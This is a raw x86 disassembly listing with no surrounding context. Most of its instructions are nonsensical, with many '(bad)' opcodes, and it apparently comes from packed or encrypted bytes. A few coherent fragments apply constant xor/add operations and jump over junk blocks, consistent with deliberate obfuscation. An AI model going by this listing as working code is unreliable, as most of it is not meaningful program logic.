  4109f1:	hlt    
  4109f2:	xlat   BYTE PTR ds:[ebx]
  4109f3:	fwait
  4109f4:	mov    ebx,0xc8471cc4
  4109f9:	cmp    edx,ebx
  4109fb:	sbb    al,0x2a
  4109fd:	add    esi,ecx
  4109ff:	pop    esi
  410a00:	lods   eax,DWORD PTR ds:[esi]
  410a01:	out    dx,eax
  410a02:	jns    0x41099a
  410a04:	pop    es
  410a05:	inc    ecx
  410a06:	jge    0x4109ba
  410a08:	into   
  410a09:	fild   DWORD PTR [esi+eiz*2]
  410a0c:	xor    eax,0x6d779adc
  410a11:	les    edx,FWORD PTR [esi+0x7073f2c8]
  410a17:	cdq    
  410a18:	aaa    
  410a19:	jo     0x4109b9
  410a1b:	push   ds
  410a1c:	jo     0x4109f5
  410a1e:	test   DWORD PTR [edi],edx
  410a20:	mov    dh,0xc7
  410a22:	hlt    
  410a23:	push   ebp
  410a24:	mov    al,0xa3
  410a26:	xlat   BYTE PTR ds:[ebx]
  410a27:	arpl   WORD PTR [edx],ax
  410a29:	push   edx
  410a2a:	sti    
  410a2b:	aas    
  410a2c:	mov    gs,WORD PTR [ebx]
  410a2e:	inc    edi
  410a2f:	lds    ecx,FWORD PTR [edi]
  410a31:	test   al,0x9e
  410a33:	ret    0x393a
  410a36:	or     DWORD PTR [ebp+0x46],eax
  410a39:	fbld   TBYTE PTR [ecx]
  410a3b:	rcr    DWORD PTR ds:0x65dbe7e7,cl
  410a41:	xor    dl,BYTE PTR [edx]
  410a43:	(bad)  
  410a44:	ss pop ebp
  410a46:	ds in  eax,dx
  410a48:	inc    ecx
  410a49:	je     0x410ac2
  410a4b:	cmp    cl,dl
  410a4d:	adc    eax,0xdeb959ad
  410a52:	adc    eax,eax
  410a54:	push   esi
  410a55:	iret   
  410a56:	cmp    al,bh
  410a58:	or     esi,edi
  410a5a:	or     eax,DWORD PTR ds:0x84ae54b8
  410a60:	sbb    DWORD PTR cs:[esi-0x41],ebx
  410a64:	arpl   bx,bx
  410a66:	mov    edi,0x413f7d03
  410a6b:	retf   0xbc7b
  410a6e:	outs   dx,DWORD PTR ds:[esi]
  410a6f:	lea    eax,[edx-0x39]
  410a72:	sbb    edi,DWORD PTR [ebx]
  410a74:	mov    esi,0xc3295b86
  410a79:	push   eax
  410a7a:	xor    al,0x15
  410a7c:	stos   DWORD PTR es:[edi],eax
  410a7d:	sub    di,WORD PTR ds:0x42624b83
  410a84:	xchg   ebp,eax
  410a85:	rcl    DWORD PTR [eax+eax*4-0x5f24df13],1
  410a8c:	jmp    0x5513:0xedcc5e8a
  410a93:	push   ecx
  410a94:	jbe    0x410a3f
  410a96:	xchg   edi,eax
  410a97:	pop    ss
  410a98:	int    0xdd
  410a9a:	mov    esp,0x4825eb0e
  410a9f:	cmp    al,BYTE PTR [edi]
  410aa1:	and    al,0xe9
  410aa3:	add    eax,0xc649ec12
  410aa8:	xchg   DWORD PTR [ecx+0x2c30c13],esi
  410aae:	xlat   BYTE PTR ds:[ebx]
  410aaf:	es add edi,edx
  410ab2:	out    0x8f,eax
  410ab4:	(bad)  
  410ab5:	in     al,0x3
  410ab7:	pop    ecx
  410ab8:	les    ebp,FWORD PTR gs:[edi+edx*8]
  410abc:	add    BYTE PTR [ebx+0x12],dl
  410abf:	cmp    dl,BYTE PTR [ecx+edx*2-0x3a802bd6]
  410ac6:	pop    edi
  410ac7:	data16 aaa 
  410ac9:	sbb    bl,BYTE PTR [edx-0x1b]
  410acc:	out    0x48,al
  410ace:	inc    esi
  410acf:	xchg   esi,eax
  410ad0:	sbb    eax,0x4bb9efba
  410ad5:	mov    ch,BYTE PTR [ecx+0x516542c0]
  410adb:	dec    eax
  410adc:	nop
  410add:	call   0xefb7:0x23d88fc3
  410ae4:	push   0x6e7e65eb
  410ae9:	lods   eax,DWORD PTR ds:[esi]
  410aea:	outs   dx,DWORD PTR ds:[esi]
  410aeb:	cmp    ebp,esi
  410aed:	mov    edx,0x15a73202
  410af2:	out    0xd3,al
  410af4:	push   ebx
  410af5:	push   edi
  410af6:	dec    esp
  410af7:	push   edi
  410af8:	pop    ds
  410af9:	mov    ds:0x99fbad37,al
  410afe:	or     bh,ah
  410b00:	sub    eax,0x18cf4fd8
  410b05:	popf   
  410b06:	xchg   ebx,eax
  410b07:	jns    0x410b04
  410b09:	push   ebp
  410b0a:	add    DWORD PTR [ecx],ebp
  410b0c:	inc    edi
  410b0d:	cmp    al,0x92
  410b0f:	push   0x8c3b578e
  410b14:	fs push ss
  410b16:	int3   
  410b17:	xchg   esp,eax
  410b18:	mov    esi,0x453e34c6
  410b1d:	cli    
  410b1e:	test   BYTE PTR ds:0xd9102877,dl
  410b24:	test   DWORD PTR [ecx-0x6c],edi
  410b27:	test   dh,bh
  410b29:	sbb    eax,0x5bbc376
  410b2e:	sbb    edx,DWORD PTR [ebx]
  410b30:	xor    eax,0x73a0b879
  410b35:	xchg   BYTE PTR [ecx-0x2f5b8d45],bl
  410b3b:	int3   
  410b3c:	adc    al,cl
  410b3e:	xchg   ebp,eax
  410b3f:	pusha  
  410b40:	add    al,0xe0
  410b42:	xchg   ebp,eax
  410b43:	add    al,0xb9
  410b45:	cwde   
  410b46:	jae    0x410bbd
  410b48:	cld    
  410b49:	pop    ebp
  410b4a:	xchg   ebx,eax
  410b4b:	(bad)  [edx-0x5d]
  410b4e:	xor    DWORD PTR [edx+ecx*2+0xa],ebx
  410b52:	xchg   ebx,eax
  410b53:	js     0x410aef
  410b55:	or     DWORD PTR [esi+0x1],0xbf407df
  410b5c:	dec    ebx
  410b5d:	sahf   
  410b5e:	push   eax
  410b5f:	inc    esi
  410b60:	or     BYTE PTR [ecx],bh
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz mov ch,0xcf
  410ba6:	cdq    
  410ba7:	ja     0x410be7
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c15
  410bb1:	in     al,dx
  410bb2:	sub    edx,DWORD PTR [esi+0x3fcb59fc]
  410bb8:	sub    eax,0x3b6c7f22
  410bbd:	mov    ecx,0x9642a839
  410bc2:	add    esi,DWORD PTR ss:[ebx-0x32a0f124]
  410bc9:	mov    ecx,0x4fcf8653
  410bce:	(bad)  [edx-0x4c]
  410bd1:	inc    ebp
  410bd2:	int    0x30
  410bd4:	and    BYTE PTR [ebx+0x2e457988],al
  410bda:	mov    ds:0x3a44c05,eax
  410bdf:	sbb    BYTE PTR [eax-0x2c],bh
  410be2:	clc    
  410be3:	xor    al,0x20
  410be5:	(bad)  
  410be6:	and    bh,dl
  410be8:	ret    0xe941
  410beb:	push   ss
  410bec:	stc    
  410bed:	mov    ah,0x10
  410bef:	pop    ecx
  410bf0:	jp     0x410c23
  410bf2:	xor    bh,dl
  410bf4:	(bad)  
  410bf5:	lods   eax,DWORD PTR ds:[esi]
  410bf6:	sbb    eax,0xe637a72a
  410bfb:	jp     0x410bef
  410bfd:	xchg   DWORD PTR [ebx],ecx
  410bff:	mov    ah,0x23
  410c01:	fadd   QWORD PTR es:[edx-0x27]
  410c05:	jge    0x410b9e
  410c07:	or     al,0x77
  410c09:	in     al,dx
  410c0a:	data16 cli 
  410c0c:	icebp  
  410c0d:	out    0x3d,al
  410c0f:	inc    esp
  410c10:	dec    ecx
  410c11:	push   esp
  410c12:	xor    eax,0x7fc1e8b6
  410c17:	mov    esp,0x6ee87cad
  410c1c:	dec    ebx
  410c1d:	pop    es
  410c1e:	or     BYTE PTR [eax],ch
  410c20:	rcr    BYTE PTR [eax-0x76d58b37],0x5
  410c27:	int    0xcd
  410c29:	cld    
  410c2a:	pusha  
  410c2b:	mov    cs,WORD PTR [ebx]
  410c2d:	stos   BYTE PTR es:[edi],al
  410c2e:	pop    ss
  410c2f:	jmp    0x80a6:0xb998ca
  410c36:	sub    BYTE PTR [ebx+0x7421498c],ah
  410c3c:	jp     0x410ca4
  410c3e:	out    dx,eax
  410c3f:	inc    ebx
  410c40:	push   es
  410c41:	pushf  
  410c42:	or     dh,BYTE PTR [eax+ebx*2]
  410c45:	mov    esi,0x4e59cef0
  410c4a:	xor    BYTE PTR [ebp-0x7],cl
  410c4d:	mov    esi,0xf6b581f9
  410c52:	ja     0x410c9b
  410c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c55:	test   eax,0x10333498
  410c5a:	fwait
  410c5b:	mov    ebp,0x2663e937
  410c60:	add    al,0x28
  410c62:	outs   dx,DWORD PTR ds:[esi]
  410c63:	enter  0xc60d,0xed
  410c67:	pushf  
  410c68:	and    BYTE PTR [ecx-0x67],dh
  410c6b:	mov    BYTE PTR [edx-0x6088b800],bh
  410c71:	aad    0xeb
  410c73:	dec    esp
  410c74:	popf   
  410c75:	mov    eax,0xe5d15246
  410c7a:	push   ds
  410c7b:	jp     0x410c10
  410c7d:	stos   BYTE PTR es:[edi],al
  410c7e:	add    ch,BYTE PTR [ecx-0x67]
  410c81:	and    edx,0x78
  410c84:	xchg   ebp,eax
  410c85:	xor    al,0x0
  410c87:	or     bl,BYTE PTR [ecx]
  410c89:	icebp  
  410c8a:	je     0x410c6a
  410c8c:	cmp    al,0xe7
  410c8e:	and    BYTE PTR [edi+eiz*8],al
  410c91:	loopne 0x410c59
  410c93:	data16 adc ah,BYTE PTR [esi]
  410c96:	sub    DWORD PTR [ecx+ebx*4],0xffffffff
  410c9a:	jae    0x410c6c
  410c9c:	mov    bh,0xa5
  410c9e:	out    0x30,eax
  410ca0:	jns    0x410c26
  410ca2:	out    dx,eax
  410ca3:	and    al,0x52
  410ca5:	les    esi,FWORD PTR [edx+0x5ad0ff5a]
  410cab:	es dec edx
  410cad:	or     al,0x1c
  410caf:	mov    esi,0x7f3bb147
  410cb4:	jae    0x410cbf
  410cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cb7:	vandnpd xmm1,xmm3,XMMWORD PTR ds:0xfee53774
  410cbf:	xchg   esi,eax
  410cc0:	adc    al,0xec
  410cc2:	sahf   
  410cc3:	xchg   ebx,esp
  410cc5:	mov    al,0x83
  410cc7:	fldlg2 
  410cc9:	xchg   BYTE PTR [ebx+0x55d794c1],bl
  410ccf:	cmp    edx,DWORD PTR [ebx+esi*8+0x51]
  410cd3:	mov    bl,0xb6
  410cd5:	(bad)  
  410cd6:	sub    al,BYTE PTR [ebx-0x19ee84ef]
  410cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cdd:	sub    cl,dh
  410cdf:	inc    ecx
  410ce0:	push   eax
  410ce1:	jmp    0x410c7c
  410ce3:	jg     0x410cc2
  410ce5:	fs and cl,al
  410ce8:	push   ds
  410ce9:	icebp  
  410cea:	inc    ebp
  410ceb:	and    dl,ah
  410ced:	aaa    
  410cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cef:	jg     0x410d3e
  410cf1:	loop   0x410caf
  410cf3:	mov    cl,0xfb
  410cf5:	in     eax,dx
  410cf6:	jg     0x410ce1
  410cf8:	mov    ebp,0x7f3f2d0
  410cfd:	cdq    
  410cfe:	popf   
  410cff:	fisubr DWORD PTR [eax+0x2a0e4d0b]
  410d05:	mov    bh,0x63
  410d07:	push   ss
  410d08:	jnp    0x410c8c
  410d0a:	repnz inc edi
  410d0c:	into   
  410d0d:	xchg   esi,eax
  410d0e:	movlps xmm0,QWORD PTR [edi]
  410d11:	pop    edi
  410d12:	pop    es
  410d13:	sub    DWORD PTR [edx],ebx
  410d15:	mov    ebp,0x5d718200
  410d1a:	cdq    
  410d1b:	sub    ecx,DWORD PTR [ebp-0x3251f3a4]
  410d21:	xchg   ecx,eax
  410d22:	or     bl,BYTE PTR [ecx-0x5f]
  410d25:	xor    al,BYTE PTR [ebp-0x7e3bdced]
  410d2b:	scas   al,BYTE PTR es:[edi]
  410d2c:	ss adc esp,edx
  410d2f:	mov    ds,esi
  410d31:	fsubr  DWORD PTR [edi+eax*2-0x70]
  410d35:	fisub  DWORD PTR [edi]
  410d37:	inc    eax
  410d38:	sbb    BYTE PTR [ecx-0x7],cl
  410d3b:	cli    
  410d3c:	xchg   edi,eax
  410d3d:	das    
  410d3e:	(bad)  
  410d3f:	ja     0x410d6b
  410d41:	call   0x7ac2:0x8374e918
  410d48:	mov    ds:0xddf4ed3a,al
  410d4d:	or     ah,BYTE PTR [ebx-0x1418e220]
  410d53:	jecxz  0x410d8c
  410d55:	xchg   esi,eax
  410d56:	jp     0x410d24
  410d58:	cwde   
  410d59:	loope  0x410ced
  410d5b:	cmp    edx,DWORD PTR [ecx]
  410d5d:	and    BYTE PTR [edx+0x25],0xdd
  410d61:	mov    eax,0x3cc4b0f4
  410d66:	mov    dl,0xda
  410d68:	icebp  
  410d69:	sahf   
  410d6a:	icebp  
  410d6b:	cs jo  0x410d3c
  410d6e:	jnp    0x410d40
  410d70:	ja     0x410d29
  410d72:	mov    eax,ds:0xf8cae934
  410d77:	les    edx,FWORD PTR [ebx]
  410d79:	pop    edi
  410d7a:	call   ebx
  410d7c:	or     esp,eax
  410d7e:	shl    DWORD PTR [ebp+0x18894cbd],1
  410d84:	hlt    
  410d85:	js     0x410d92
  410d87:	cmp    dl,BYTE PTR [ebx]
  410d89:	out    dx,eax
  410d8a:	push   ecx
  410d8b:	mov    ebp,DWORD PTR [ebx]
  410d8d:	(bad)  
  410d8e:	icebp  
  410d8f:	jne    0x410d51
  410d91:	jmp    0x410d34
  410d93:	aam    0xae
  410d95:	xchg   DWORD PTR [edi-0x22],edx
  410d98:	push   ds
  410d99:	jns    0x410de3
  410d9b:	sub    dh,BYTE PTR [edx]
  410d9d:	xlat   BYTE PTR ds:[ebx]
  410d9e:	test   eax,ebp
  410da0:	push   es
  410da1:	out    0x3e,al
  410da3:	add    al,0x54
  410da5:	mov    ebp,0x2190dc86
  410daa:	leave  
  410dab:	repz aad 0x2a
  410dae:	test   DWORD PTR [edi],ebx
  410db0:	inc    esi
  410db1:	mov    cs,WORD PTR [eax+0xa]
  410db4:	lods   eax,DWORD PTR ds:[esi]
  410db5:	stos   DWORD PTR es:[edi],eax
  410db6:	scas   al,BYTE PTR es:[edi]
  410db7:	mov    ebp,0x88c0052a
  410dbc:	cmp    eax,0xde1ce41
  410dc1:	mov    ecx,DWORD PTR [ebx+eiz*8+0x148c5a5b]
  410dc8:	or     eax,0x288704c4
  410dcd:	outs   dx,DWORD PTR ds:[esi]
  410dce:	mov    ds:0x22222efb,eax
  410dd3:	sub    BYTE PTR [edi+edx*2+0x78],dh
  410dd7:	mov    edi,0xc4abe08e
  410ddc:	pop    ebp
  410ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dde:	push   cs
  410ddf:	fmul   DWORD PTR ds:0xcf6ad156
  410de5:	retf   0x94e3
  410de8:	pop    ebp
  410de9:	das    
  410dea:	pusha  
  410deb:	sbb    ebx,DWORD PTR cs:[esi+0x3b526a26]
  410df2:	(bad)  
  410df3:	in     eax,0x54
  410df5:	push   ds
  410df6:	in     eax,0xce
  410df8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  410dfa:	jno    0x410da9
  410dfc:	test   al,0x51
  410dfe:	inc    edx
  410dff:	fstp   TBYTE PTR [eax-0x3b2f93e4]
  410e05:	int3   
  410e06:	sbb    BYTE PTR [edx-0x24],cl
  410e09:	fild   QWORD PTR [ebx-0x39]
  410e0c:	cli    
  410e0d:	inc    esp
  410e0e:	jo     0x410de8
  410e10:	mov    eax,0x72081a7b
  410e15:	ja     0x410e25
  410e17:	mov    dl,dl
  410e19:	inc    eax
  410e1a:	cs cmp al,0x30
  410e1d:	push   ecx
  410e1e:	test   BYTE PTR [esi],bl
  410e20:	push   ebp
  410e21:	fstp   QWORD PTR [edi]
  410e23:	push   0xffffffb0
  410e25:	dec    edi
  410e26:	mov    dh,0x25
  410e28:	adc    al,0x6f
  410e2a:	cmp    eax,0x48324c9a
  410e2f:	(bad)  
  410e30:	hlt    
  410e31:	add    al,0x85
  410e33:	mov    edx,0xeb664ab7
  410e38:	clc    
  410e39:	(bad)  
  410e3a:	es xchg ebp,eax
  410e3c:	daa    
  410e3d:	push   cs
  410e3e:	ins    DWORD PTR es:[edi],dx
  410e3f:	push   ebx
  410e40:	adc    eax,DWORD PTR [ecx]
  410e42:	adc    al,0x4f
  410e44:	pop    ss
  410e45:	pop    DWORD PTR [edx]
  410e47:	mov    ah,0x27
  410e49:	mov    dl,0x55
  410e4b:	adc    BYTE PTR [ebp-0x51],cl
  410e4e:	mov    edi,0x53e6ce9e
  410e53:	test   al,0x79
  410e55:	adc    eax,0xfbd5fe4c
  410e5a:	add    esp,ebx
  410e5c:	sub    BYTE PTR [ecx+eax*4-0x7b],ah
  410e60:	sbb    BYTE PTR [ebx+0x1c],bl
  410e63:	inc    ecx
  410e64:	lods   al,BYTE PTR ds:[esi]
  410e65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e66:	in     al,dx
  410e67:	pop    eax
  410e68:	sbb    ch,BYTE PTR [eax+0x30]
  410e6b:	lds    edi,FWORD PTR [ebx*2+0x7caacded]
  410e72:	fcmovnb st,st(3)
  410e74:	test   dh,dl
  410e76:	sub    bh,BYTE PTR [esi]
  410e78:	adc    edi,DWORD PTR [ebp+0x1d]
  410e7b:	pop    ebp
  410e7c:	sbb    al,0x3b
  410e7e:	cld    
  410e7f:	xor    dl,BYTE PTR [eax]
  410e81:	add    DWORD PTR [ebx+edx*2-0x61],ebp
  410e85:	mov    ch,0x5f
  410e87:	fcom   DWORD PTR [edx-0x65]
  410e8a:	std    
  410e8b:	(bad)  
  410e8c:	fs das 
  410e8e:	dec    edi
  410e8f:	sbb    eax,0x33
  410e92:	stos   BYTE PTR es:[edi],al
  410e93:	rcr    esp,0xdc
  410e96:	xchg   BYTE PTR [esi],dl
  410e98:	or     al,0x48
  410e9a:	pop    esp
  410e9b:	(bad)  
  410e9c:	data16 ins BYTE PTR es:[edi],dx
  410e9e:	ds (bad) 
  410ea1:	inc    edi
  410ea2:	(bad)  
  410ea3:	and    DWORD PTR [eax+0x890e8a4],edx
  410ea9:	xor    BYTE PTR [ecx-0x48],bh
  410eac:	fcmovnb st,st(5)
  410eae:	out    0x76,eax
  410eb0:	xchg   ebp,eax
  410eb1:	adc    BYTE PTR [esi-0x3afb2214],0x20
  410eb8:	or     eax,0xde0f3593
  410ebd:	xchg   DWORD PTR [ebp+0x6e9f14c0],eax
  410ec3:	fs xor al,0x6
  410ec6:	jae    0x410e53
  410ec8:	mov    ?,esi
  410eca:	outs   dx,DWORD PTR ds:[esi]
  410ecb:	xchg   edi,eax
  410ecc:	sbb    DWORD PTR [ebx],eax
  410ece:	ss mov bh,0x4b
  410ed1:	inc    edi
  410ed2:	push   edi
  410ed3:	sbb    DWORD PTR [eax-0x7fd6dbb1],edi
  410ed9:	cdq    
  410eda:	es inc edx
  410edc:	jg     0x410f5d
  410ede:	(bad)  
  410edf:	mov    eax,0x7bc08ee0
  410ee4:	mov    WORD PTR [ebx],?
  410ee6:	mov    edx,0xc4b9ec7d
  410eeb:	aaa    
  410eec:	pushf  
  410eed:	add    BYTE PTR [edx],0x2
  410ef0:	sahf   
  410ef1:	mov    esi,0x9979ee50
  410ef6:	or     BYTE PTR [ecx-0xe],al
  410ef9:	and    eax,0x3900b9d9
  410efe:	(bad)  
  410eff:	fld    TBYTE PTR [esi]
  410f01:	pop    ss
  410f02:	pop    edx
  410f03:	lods   al,BYTE PTR ds:[esi]
  410f04:	jne    0x410eb7
  410f06:	sub    esi,DWORD PTR [edx+0x12d6bafb]
  410f0c:	call   0xc785:0xf2469076
  410f13:	push   edi
  410f14:	xchg   esi,eax
  410f15:	ret    
  410f16:	jecxz  0x410f1a
  410f18:	add    BYTE PTR [ebp+0x21c5b8c0],dl
  410f1e:	push   es
  410f1f:	cmp    eax,0x4bd60544
  410f24:	mov    bl,0x2e
  410f26:	jae    0x410f6e
  410f28:	mov    bl,0xf2
  410f2a:	ins    DWORD PTR es:[edi],dx
  410f2b:	cdq    
  410f2c:	add    al,0x83
  410f2e:	pop    esi
  410f2f:	mov    eax,ds:0x7911210e
  410f34:	sub    edi,DWORD PTR [edx-0x5b]
  410f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f38:	jmp    0xf157a96
  410f3d:	mov    fs,WORD PTR [eax+0x267ff44b]
  410f43:	mov    BYTE PTR [eax-0x7ee839d3],dl
  410f49:	pop    ebp
  410f4a:	test   al,0x15
  410f4c:	int    0x65
  410f4e:	ficomp DWORD PTR [ecx+ebp*2]
  410f51:	rol    ebx,0x35
  410f54:	adc    DWORD PTR [eax],edi
  410f56:	xchg   ebp,eax
  410f57:	adc    ebx,eax
  410f59:	xchg   ecx,eax
  410f5a:	sbb    ah,BYTE PTR [edx]
  410f5c:	adc    BYTE PTR [esi],ch
  410f5e:	inc    DWORD PTR [ecx]
  410f60:	jne    0x410eea
  410f62:	sbb    al,0xd3
  410f64:	in     eax,dx
  410f65:	add    ecx,eax
  410f67:	dec    eax
  410f68:	sub    al,0xcf
  410f6a:	(bad)  
  410f6b:	mov    ebx,0xf3c9c85c
  410f70:	cmp    cl,al
  410f72:	mov    bh,0x39
  410f74:	and    al,0x74
  410f76:	fwait
  410f77:	jno    0x410f85
  410f79:	mov    ah,0x3f
  410f7b:	dec    edx
  410f7c:	and    BYTE PTR gs:[ebx-0xa44e8ad],dh
  410f83:	loope  0x410f48
  410f85:	push   ebx
  410f86:	ss stos DWORD PTR es:[edi],eax
  410f88:	pusha  
  410f89:	fcomp  QWORD PTR [eax+0x24]
  410f8c:	add    BYTE PTR [ebp+eiz*8-0x1f],dh
  410f90:	adc    ebp,DWORD PTR [edx+0x63]
  410f93:	mov    al,ds:0x1efcab01
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x1f0cdfc2]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f8c
  410fdd:	mov    ebp,ds
  410fdf:	das    
  410fe0:	add    dh,0xce
  410fe3:	xchg   esi,eax
  410fe4:	or     DWORD PTR [ecx],esp
  410fe6:	dec    ecx
  410fe7:	pop    es
  410fe8:	(bad)  
  410fe9:	xchg   ecx,eax
  410fea:	leave  
  410feb:	not    edi
  410fed:	or     ebx,edx
  410fef:	pop    edx
  410ff0:	jae    0x411019
  410ff2:	dec    esp
  410ff3:	out    dx,al
  410ff4:	pushf  
  410ff5:	or     eax,0x36509104
  410ffa:	hlt    
  410ffb:	xor    eax,0x7d060e69
  411000:	outs   dx,BYTE PTR ds:[esi]
  411001:	sub    eax,0x8c1ede6c
  411006:	fwait
  411007:	loopne 0x411056
  411009:	fcom   st(7)
  41100b:	lods   eax,DWORD PTR ds:[esi]
  41100c:	mov    ds:0x9816522f,eax
  411011:	and    al,0x50
  411013:	xor    esi,esi
  411015:	stos   BYTE PTR es:[edi],al
  411016:	mov    dl,0xc8
  411018:	clc    
  411019:	dec    eax
  41101a:	lods   al,BYTE PTR ds:[esi]
  41101b:	int    0xe4
  41101d:	mov    cl,0xb5
  41101f:	jnp    0x411056
  411021:	ret    
  411022:	(bad)  
  411023:	sbb    dh,BYTE PTR [ebx]
  411025:	sub    DWORD PTR [eax],esi
  411027:	adc    al,0x9d
  411029:	push   0xffffffc3
  41102b:	jp     0x4110ac
  41102d:	pop    eax
  41102e:	loop   0x410fef
  411030:	mov    esi,DWORD PTR [edi+0x35eb95d6]
  411036:	mov    cl,0x49
  411038:	(bad)  
  411039:	cmp    ecx,esi
  41103b:	inc    ebx
  41103c:	xchg   edi,eax
  41103d:	cdq    
  41103e:	and    eax,0xe24ebbe
  411043:	mov    ebx,0xef94f41d
  411048:	mov    BYTE PTR [edx],bl
  41104a:	enter  0x7bf5,0x5b
  41104e:	iret   
  41104f:	aaa    
  411050:	push   es
  411051:	and    al,0x15
  411053:	js     0x41109c
  411055:	pop    edx
  411056:	lds    ecx,FWORD PTR [ecx+0x6e273011]
  41105c:	scas   al,BYTE PTR es:[edi]
  41105d:	xor    BYTE PTR [edi+0x44],ah
  411060:	test   eax,0xfabaee96
  411065:	adc    al,BYTE PTR [ebp-0x3]
  411068:	or     bh,BYTE PTR [edx-0x2d9793a3]
  41106e:	(bad)  
  41106f:	stos   BYTE PTR es:[edi],al
  411070:	jnp    0x4110ec
  411072:	and    BYTE PTR [ebp+eax*1+0x60],dh
  411076:	fs fs jbe 0x4110c9
  41107a:	xchg   ebx,eax
  41107b:	push   esi
  41107c:	add    al,0x19
  41107e:	adc    dl,BYTE PTR [esi-0x4d]
  411081:	retf   0x9507
  411084:	add    DWORD PTR [eax],0xfffffff1
  411087:	cwde   
  411088:	fnstenv [ecx-0x36]
  41108b:	and    al,BYTE PTR [ecx-0x3a]
  41108e:	clc    
  41108f:	stc    
  411090:	popa   
  411091:	(bad)  
  411092:	icebp  
  411093:	sbb    ch,BYTE PTR [eax]
  411095:	push   ds
  411096:	loopne 0x411085
  411098:	adc    al,0xe6
  41109a:	hlt    
  41109b:	push   ss
  41109c:	and    BYTE PTR [edx],dh
  41109e:	sbb    bl,BYTE PTR [ebp+0x5e]
  4110a1:	adc    eax,0xfd599ebf
  4110a6:	mov    ds:0x64492d34,al
  4110ab:	adc    ecx,DWORD PTR [esi-0x11]
  4110ae:	hlt    
  4110af:	mov    edi,0x1e261ad4
  4110b4:	mov    ebx,0x46fe1fa1
  4110b9:	jmp    0x411091
  4110bb:	mov    dl,0x28
  4110bd:	adc    eax,0xae3144ad
  4110c2:	aam    0x5
  4110c4:	add    ah,cl
  4110c6:	dec    edx
  4110c7:	and    bl,BYTE PTR gs:[ecx+0x8]
  4110cb:	inc    ebp
  4110cc:	inc    esp
  4110cd:	in     eax,0xa1
  4110cf:	jne    0x4110a6
  4110d1:	fnstenv [edx-0x11833706]
  4110d7:	imul   BYTE PTR [eax-0x20]
  4110da:	hlt    
  4110db:	xchg   esi,eax
  4110dc:	pushf  
  4110dd:	out    dx,al
  4110de:	test   al,dh
  4110e0:	call   DWORD PTR [ebp+0x69]
  4110e3:	in     al,dx
  4110e4:	push   ebp
  4110e5:	jmp    0xc33cc199
  4110ea:	xor    DWORD PTR [eax+0x2e],edx
  4110ed:	xchg   ebx,eax
  4110ee:	add    bl,0x9c
  4110f1:	repz pop esp
  4110f3:	push   eax
  4110f4:	es mov eax,0x5a380410
  4110fa:	loopne 0x4110f5
  4110fc:	cmp    cl,BYTE PTR [ecx]
  4110fe:	add    BYTE PTR [eax],ch
  411100:	ins    BYTE PTR es:[edi],dx
  411101:	jle    0x411125
  411103:	call   0xfc53:0x88912426
  41110a:	mov    ch,0xfb
  41110c:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41110e:	pop    esi
  41110f:	jb     0x411144
  411111:	loope  0x411114
  411113:	jge    0x411100
  411115:	loope  0x411180
  411117:	xchg   esi,eax
  411118:	pop    ds
  411119:	dec    esi
  41111a:	push   ebx
  41111b:	retf   0x7908
  41111e:	xor    eax,0x23a4b6d7
  411123:	jp     0x41113f
  411125:	cmp    cl,dh
  411127:	pop    esp
  411128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411129:	clc    
  41112a:	sar    BYTE PTR [esi-0x73],1
  41112d:	push   edx
  41112e:	add    ah,ch
  411130:	scas   al,BYTE PTR es:[edi]
  411131:	adc    DWORD PTR [ecx],esi
  411133:	fistp  WORD PTR [edi-0xd]
  411136:	loop   0x41115b
  411138:	loope  0x41116f
  41113a:	jne    0x41114f
  41113c:	inc    ebp
  41113d:	cmc    
  41113e:	push   es
  41113f:	sbb    esp,DWORD PTR [esi+0x6728a3e5]
  411145:	ss mov ebp,0x52b8a3c4
  41114b:	jmp    0x3fc5:0x4433bf6d
  411152:	and    bl,cl
  411154:	aad    0x96
  411156:	fbld   TBYTE PTR [ebp+0x62]
  411159:	pop    ds
  41115a:	push   esp
  41115b:	push   cs
  41115c:	(bad)  
  41115d:	(bad)  
  41115e:	fcmovu st,st(3)
  411160:	es pusha 
  411162:	outs   dx,BYTE PTR ds:[esi]
  411163:	cmp    al,0x47
  411165:	sar    dl,1
  411167:	xor    BYTE PTR [ebx+edx*4],dl
  41116a:	sub    al,0x43
  41116c:	int3   
  41116d:	fld    DWORD PTR fs:[edx+0x38d855d4]
